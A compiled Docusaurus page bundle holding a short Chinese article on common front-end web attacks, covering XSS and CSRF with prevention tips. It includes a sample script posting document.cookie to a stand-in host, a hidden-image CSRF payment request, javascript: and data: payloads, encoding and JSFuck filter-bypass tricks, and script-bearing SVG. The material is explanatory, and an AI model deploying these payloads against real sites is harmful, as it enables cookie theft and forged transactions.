"use strict";(self.webpackChunkdocusaurus=self.webpackChunkdocusaurus||[]).push([["2146"],{99553:function(e,n,s){s.r(n),s.d(n,{metadata:()=>r,contentTitle:()=>l,default:()=>u,assets:()=>d,toc:()=>o,frontMatter:()=>c});var r=JSON.parse('{"id":"engineering/26487","title":"\u5E38\u89C1\u7684 web \u524D\u7AEF\u653B\u51FB\u65B9\u5F0F\u6709\u54EA\u4E9B\uFF1F","description":"\u5B89\u5168","source":"@site/issue/8.engineering/26487.md","sourceDirName":"8.engineering","slug":"/26487","permalink":"/issue/26487","draft":false,"unlisted":false,"editUrl":"/feedback","tags":[],"version":"current","lastUpdatedBy":"lzw","lastUpdatedAt":1712409180000,"frontMatter":{"date":"2020-10-29 15:54:00","slug":"/26487"},"sidebar":"tutorialSidebar","previous":{"title":"\u624B\u5199\u8282\u6D41 throttle","permalink":"/issue/26484"},"next":{"title":"\u524D\u7AEF\u4E3A\u4F55\u8981\u6253\u5305\u548C\u6784\u5EFA\uFF1F","permalink":"/issue/27209"}}'),t=s("85893"),i=s("50065");let c={date:"2020-10-29 15:54:00",slug:"/26487"},l="\u5E38\u89C1\u7684 web \u524D\u7AEF\u653B\u51FB\u65B9\u5F0F\u6709\u54EA\u4E9B\uFF1F",d={},o=[];function a(e){let n={a:"a",code:"code",h1:"h1",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"\u5E38\u89C1\u7684-web-\u524D\u7AEF\u653B\u51FB\u65B9\u5F0F\u6709\u54EA\u4E9B",children:"\u5E38\u89C1\u7684 web \u524D\u7AEF\u653B\u51FB\u65B9\u5F0F\u6709\u54EA\u4E9B\uFF1F"})}),"\n",(0,t.jsx)(n.p,{children:"\u5B89\u5168"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"XSS \u8DE8\u7AD9\u8BF7\u6C42\u653B\u51FB\uFF08\u53CD\u5C04\u578B\uFF0C\u5B58\u50A8\u578B\uFF0CDOM\u578B\uFF09"}),"\n",(0,t.jsx)(n.li,{children:"XSRF \u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"XSS \u8DE8\u7AD9\u8BF7\u6C42\u653B\u51FB"}),"\n",(0,t.jsxs)(n.p,{children:["\u6BD4\u5982\uFF1A\u4E00\u4E2A\u535A\u5BA2\u7F51\u7AD9\uFF0C\u6211\u53D1\u8868\u4E00\u7BC7\u535A\u5BA2\uFF0C\u5176\u4E2D\u5D4C\u5165 ",(0,t.jsx)(n.code,{children:"<script />"}),"\u811A\u672C\uFF0C\u83B7\u53D6 cookie\uFF0C\u53D1\u9001\u5230\u6211\u7684\u8DE8\u57DF\u670D\u52A1\u5668\uFF0C\u5F53\u6709\u4EBA\u67E5\u770B\u8FD9\u7BC7\u6587\u7AE0\uFF0C\u6211\u53EF\u4EE5\u83B7\u53D6\u8BBF\u95EE\u8005\u7684 cookie"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-js",children:"<p>\u6A21\u62DF XSS \u8DE8\u7AD9\uFF0C\u83B7\u53D6 cookie</p>\n<script> alert(document.cookie);$.post('test.com', {cookie: document.cookie}) <\/script>\n"})}),"\n",(0,t.jsxs)(n.p,{children:["XSS \u9884\u9632\uFF08\u4E5F\u53EF\u4EE5\u4F7F\u7528 XSS \u5DE5\u5177\uFF0C\u5982 ",(0,t.jsx)(n.a,{href:"https://www.npmjs.com/package/xss",children:"https://www.npmjs.com/package/xss"}),"\uFF09"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\u66FF\u6362\u7279\u6B8A\u5B57\u7B26\uFF0C\u5982 < \u53D8\u6210",(0,t.jsx)(n.code,{children:"&lt;"})," > \u53D8\u6210",(0,t.jsx)(n.code,{children:"`&gt;`"})]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"<script>"})," \u53D8\u6210 ",(0,t.jsx)(n.code,{children:"&lt;script&gt;"})," ,\u8FD9\u6837\u4E0D\u4F1A\u4F5C\u4E3A\u811A\u672C\u6267\u884C"]}),"\n",(0,t.jsx)(n.li,{children:"\u5EFA\u8BAE\u524D\u540E\u7AEF\u90FD\u66FF\u6362"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-js",children:"&lt;script&gt; alert(document.cookie);$.post('test.com', {cookie: document.cookie}) &lt;/script&gt;\n"})}),"\n",(0,t.jsx)(n.p,{children:"CSRF/XSRF \u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020"}),"\n",(0,t.jsxs)(n.p,{children:["\u6BD4\u5982\uFF1A\u4F60\u6B63\u5728\u8D2D\u7269\uFF0C\u770B\u4E2D\u4E86\u67D0\u4E2A\u5546\u54C1\uFF0C\u5546\u54C1 id \u662F 100\uFF0C\u4ED8\u6B3E\u63A5\u53E3\uFF1Axxx.com/pay?id=100\uFF0C\u4F46\u6CA1\u4EFB\u4F55\u9A8C\u8BC1\uFF0C\u653B\u51FB\u8005\u60F3\u8D2D\u4E70 id \u4E3A 200 \u7684\u5546\u54C1\uFF0C\u901A\u8FC7\u53D1\u9001\u90AE\u4EF6\u9690\u85CF ",(0,t.jsx)(n.code,{children:'<img src="xxx.com/pay?id=200" />'}),"\uFF0C\u4E00\u65E6\u67E5\u770B\u90AE\u4EF6\uFF0C\u5C31\u8D2D\u4E70\u4E86 id \u4E3A 200 \u7684\u5546\u54C1"]}),"\n",(0,t.jsx)(n.p,{children:"XSRF \u9884\u9632\uFF08\u73B0\u5728\u5F88\u5C11\u89C1\u4E86\uFF09"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"\u4F7F\u7528 post \u63A5\u53E3"}),"\n",(0,t.jsx)(n.li,{children:"\u589E\u52A0\u9A8C\u8BC1\uFF0C\u4F8B\u5982\u5BC6\u7801\uFF0C\u77ED\u4FE1\u9A8C\u8BC1\u7801\uFF0C\u6307\u7EB9\u7B49"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"\u5176\u4ED6"})}),"\n",(0,t.jsx)(n.p,{children:"\u4E3A\u534F\u8BAE\uFF1A"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["Data \u4E3A\u534F\u8BAE\uFF1Adata",":text","/html;base64,PHNjcsdd="]}),"\n",(0,t.jsxs)(n.li,{children:["JavaScript\u4E3A\u534F\u8BAE\uFF1Ajavascript",":alert","(1)"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Unicode \u7F16\u7801\u53CA URL \u7F16\u7801\u7ED5\u8FC7\uFF1A"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"JavaScript \u7F16\u7801\uFF1A&#x\uFF0C\\u \u90FD\u53EF\u4EE5\u7528\u6765\u8868\u793A\u4E00\u4E32 Unicode \u7F16\u7801\uFF0C\u5982\uFF1A\\u0074 \\u0065 \\u0073 \\u0074 \u6216 &#x0074 &#x0065 &#x0073 &#x0074"}),"\n",(0,t.jsx)(n.li,{children:"HTML\u5B9E\u4F53\u7F16\u7801\uFF1A&#116 &#101 &#115 &#116"}),"\n",(0,t.jsx)(n.li,{children:"URL\u7F16\u7801\uFF1A%74 %65 %73 %74"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"xss \u8815\u866B\uFF0C\u6BD4\u5982\uFF1A myspace\u8815\u866B\u653B\u51FB"}),"\n",(0,t.jsxs)(n.p,{children:["xss \u7F16\u7801\u6DF7\u6DC6\uFF0C\u5229\u7528\u6D4F\u89C8\u5668\u89E3\u6790\u7F16\u7801\u7684\u987A\u5E8F ",(0,t.jsx)(n.code,{children:"js <- url <- html"}),"\uFF0C\u6BD4\u5982\uFF1A jsFuck \u4F7F\u7528 6 \u4E2A\u5B57\u7B26 []()!+ \u6765\u7F16\u5199"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-js",children:'false       =>  ![]\ntrue        =>  !![]\nundefined   =>  [][[]]\nNaN         =>  +[![]]\n0           =>  +[]\n1           =>  +!+[]\n2           =>  !+[]+!+[]\n10          =>  +[[+!+[]]+[+[]]]\nArray       =>  []\nNumber      =>  +[]\nString      =>  []+[]\nBoolean     =>  ![]\nFunction    =>  []["filter"]\nrun         =>  []["filter"]["constructor"]( CODE )()\neval        =>  []["filter"]["constructor"]("return eval")()( CODE )\nwindow      =>  []["filter"]["constructor"]("return this")()\n'})}),"\n",(0,t.jsx)(n.p,{children:"SVG \u6587\u4EF6\u4E2D\u63D2\u5165 JS \u4EE3\u7801"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-js",children:'<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg">\n	<script>\n		alert(11)\n	<\/script>\n</svg>\n'})})]})}function u(e={}){let{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(a,{...e})}):a(e)}},50065:function(e,n,s){s.d(n,{Z:function(){return l},a:function(){return c}});var r=s(67294);let t={},i=r.createContext(t);function c(e){let n=r.useContext(i);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:c(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);